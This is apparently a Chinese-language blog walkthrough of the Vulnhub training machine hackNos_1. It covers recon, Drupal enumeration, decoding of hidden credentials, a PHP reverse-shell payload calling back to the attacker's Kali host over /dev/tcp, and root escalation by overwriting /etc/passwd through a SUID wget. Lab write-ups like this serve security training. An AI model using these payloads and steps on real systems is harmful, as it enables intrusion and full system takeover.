---
layout: post
title: "Os hackNos_1 walkthrough"
date: 2021-06-27
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP               |
| ------------- | ---------------- |
| 本机（Win10） | `192.168.36.234` |
| Kali          | `192.168.36.89`  |
| OS-hackNos-1  | `192.168.36.161` |

### 扫描端口和版本信息

`nmap -A 192.168.36.161`

```shell
┌──(root💀kali)-[~]
└─# nmap -A 192.168.36.161
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 12:00 UTC
Nmap scan report for 192.168.36.161
Host is up (0.014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

输出结果中规中矩，开启**80**和**22**端口。下一步进行目录枚举

### 枚举目录

```shell
┌──(root💀kali)-[~]
└─# dirb http://192.168.36.161
...
---- Scanning URL: http://192.168.36.161/ ----
==> DIRECTORY: http://192.168.36.161/drupal/
+ http://192.168.36.161/index.html (CODE:200|SIZE:11321)
+ http://192.168.36.161/server-status (CODE:403|SIZE:279)

---- Entering directory: http://192.168.36.161/drupal/ ----
==> DIRECTORY: http://192.168.36.161/drupal/includes/
+ http://192.168.36.161/drupal/index.php (CODE:200|SIZE:9253)
==> DIRECTORY: http://192.168.36.161/drupal/misc/
==> DIRECTORY: http://192.168.36.161/drupal/modules/
==> DIRECTORY: http://192.168.36.161/drupal/profiles/
+ http://192.168.36.161/drupal/robots.txt (CODE:200|SIZE:2189)
==> DIRECTORY: http://192.168.36.161/drupal/scripts/
==> DIRECTORY: http://192.168.36.161/drupal/sites/
==> DIRECTORY: http://192.168.36.161/drupal/themes/
+ http://192.168.36.161/drupal/web.config (CODE:200|SIZE:2200)
+ http://192.168.36.161/drupal/xmlrpc.php (CODE:200|SIZE:42)
```

根据结果可知该网站使用的是Drupal CMS，并且只能确定主版本号是**7**，后续根据版本号找漏洞就比较麻烦，不过在*searchsploit*搜索结果中，该版本的漏洞挺多的，挨个进行测试就比较费时，因此将操作做为备用计划。

> 后来复盘时发现可以在该*http://192.168.36.161/drupal/CHANGELOG.txt*文件中找到具体版本号

经过一些尝试后发现在根目录中存在一个*alexander.txt*文本文件，内容是

```
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
```

将内容进行Base64、[brainfack](https://www.dcode.fr/brainfuck-language
)解密，得到一个账户名和密码信息：`james:Hacker@4514`

### 访问Web并登录

使用得到的账户和密码进行登录，接下来就是Drupal GetShell常用操作：启用**PHP filter**模块-> 新建一个PHP code格式的**Article**页面。在内容中写一个反向shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.36.89/5566 0>&1'");?>
```

### GetShell

```shell
┌──(root💀kali)-[~]
└─# nc -lvp 5566
listening on [any] 5566 ...
192.168.36.161: inverse host lookup failed: Unknown host
connect to [192.168.36.89] from (UNKNOWN) [192.168.36.161] 46488
bash: cannot set terminal process group (1171): Inappropriate ioctl for device
bash: no job control in this shell
www-data@hackNos:/var/www/html/drupal$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

在*james*用户目录下找到第一个flag

```shell
www-data@hackNos:/home/james$ cat user.txt
cat user.txt
   _
  | |
 / __) ______  _   _  ___   ___  _ __
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |
  |_|          \__,_||___/ \___||_|



MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

但尝试切换到*james*账户不成功，并且也没有发现有其他用户

### 提权

在提权步骤中，常见操作是找SUID文件，具体操作为`find / -type f -perm -u=s 2>/dev/null`，在结果中发现**/usr/bin/wget**具备SUID权限

```shell
www-data@hackNos:/home/james$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/wget
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

接下来的具体操作可以参考[这篇文章](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/)：

1. 使用*openssl*新建用户和密码

   `openssl passwd -1 -salt 2hanx passwd`

2. 将生成的账户信息附加在*passwd*文本文件中

   `hacker:$1$2hanx$yGPOMAbu/gZJ8reFaXSMo/:0:0:,,,/root:/bin/bash`

3. 靶机通过*/usr/bin/wget*命令将更改后的*passwd*文件保存替换原*/etc/passwd*文件，这样靶机系统中就存在新的用户

4. 切换到新用户*hacker:passwd*

5. 提权到*root* shell，查看最后一个flag即可

   ```shell
   root@hackNos:/root# cat root.txt
   cat root.txt
       _  _                              _
     _| || |_                           | |
    |_  __  _|______  _ __  ___    ___  | |_
     _| || |_|______|| '__|/ _ \  / _ \ | __|
    |_  __  _|       | |  | (_) || (_) || |_
      |_||_|         |_|   \___/  \___/  \__|
   
   
   
   MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
   
   Author : Rahul Gehlaut
   
   Linkedin : https://www.linkedin.com/in/rahulgehlaut/
   
   Blog : www.hackNos.com
   ```

### 总结

在确定Drupal版本后根据*searchsploit*结果，可以尝试使用`Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)`，该PoC前置条件需要先进行账户登录。